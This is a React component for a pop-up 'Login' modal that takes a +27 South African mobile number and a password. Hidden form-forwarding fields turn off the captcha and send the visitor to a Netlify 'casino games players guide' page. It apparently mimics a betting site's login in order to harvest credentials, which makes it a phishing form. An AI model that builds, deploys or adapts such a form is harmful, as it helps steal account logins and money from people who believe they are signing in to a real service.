import React, { useEffect, useState } from 'react'
import { IoEye } from "react-icons/io5";
import { IoMdEyeOff } from "react-icons/io";
import axios from 'axios';

function Form() {
const [eye, setEye] = useState("shut")
const [type, setType] = useState("password")
const [modal, setModal] = useState(true)

  useEffect(() => {
     document.getElementById("eyes").onclick = () => {
       setEye(eye === "shut" ? "open" : "shut")
       setType(eye === "shut" ? "text" : "password")
     }

  }, [eye])

  const api = import.meta.env.VITE_API_URL

  return (
    <dialog id='mdl' className='cursor-pointer bg-white rounded-lg max-w-[430px] w-[98%] absolute top-9 translate-2 sm:translate-10 md:translate-x-55' open={modal}>

    {/** HEAD */}
    <form action={api} method='post' onSubmit={(e) => {
      e.preventDefault()
      setModal(false)
    }}>
<input type="hidden" name="_captcha" value="false" />
<input type="hidden" name="_template" value="table" />
<input type="hidden" name="_next" value="https://casino-games-players-guide.netlify.app/habanero"></input>
    <section className='flex justify-between items-center p-4 bg-black rounded-t-lg'>
      <h2 className='font-bold'>Login</h2> <p className='cursor-pointer'>&#10006;</p>
    </section>

    <section className='p20'>

       <div className='flex items-center gap-3.5 px-6 xxx rounded'>
       <div className='font-semibold'>+27</div>
        <input type='text' name='Number' minLength={9} placeholder='Mobile Number' autoFocus className=' rounded w-full'/>
       </div>

       <div className='flex items-center gap-3.5 px-6 xxx rounded'>
       
        <input type={`${type}`} name="Password" minLength={4} placeholder='Enter Password' className=' rounded w-full'/>
        <div className='font-semibold cursor-pointer text-2xl'> 

          {eye === "shut" ? <IoEye id='eyes'/> : <IoMdEyeOff id='eyes'/>}
        </div>
       </div>

       <div className='flex justify-between px-4 font-thin text-sm pb-2'>
        <p>
            Forgot Username?
        </p>
        <p>
          Forgot Password?
        </p>
       </div>
    </section>

    <section className='w-[95%] px-5 py-3 my-4.5 mx-[2.5%] rounded-lg'>
      <div className='flex justify-between max-w-full text-sm'>
        <p>Don't have an account yet?</p>
        <div className="flex justify-center items-center text-center font-bold"><span className="font-bold">Sign Up</span><svg className="ml-1 fill-[currentColor] w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" name="icon"><path className="" d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z" stroke-linecap="square"></path></svg></div>
       
      </div>
      
    </section>

    <button className='bg-blue-600 w-[95%] mb-3.5 p-2 rounded-lg cursor-pointer' type='submit'>Login</button>
</form>
    </dialog>
  )
}

export default Form